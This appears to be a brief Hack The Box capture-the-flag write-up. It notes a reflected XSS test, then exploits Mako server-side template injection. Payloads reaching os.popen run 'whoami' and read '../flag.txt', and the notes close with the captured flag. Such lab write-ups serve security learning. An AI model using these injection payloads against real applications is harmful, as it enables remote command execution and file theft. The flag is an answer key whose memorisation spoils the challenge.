I noticed that the web is vulnerable to xss: 
`94.237.63.132:33701/?text=<script>alert("hola")</script>`
![](Screenshots/Pasted%20image%2020250115000843.png)
I opened vs code 
![[Screenshots/Pasted image 20250115000534.png]]

It is vulnerable to SSTI (Server Side Template Injection), with Mako template library: 
![](Screenshots/Pasted%20image%2020250115011337.png)


I tried first with `${self.module.cache.util.os.system("id")}` but 0
![](Screenshots/Pasted%20image%2020250115011435.png)

Instead: `${self.module.cache.util.os.popen('whoami').read()}`
![](Screenshots/Pasted%20image%2020250115011706.png)
We have the flag: ${self.module.cache.util.os.popen('cat ../flag.txt').read()}
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
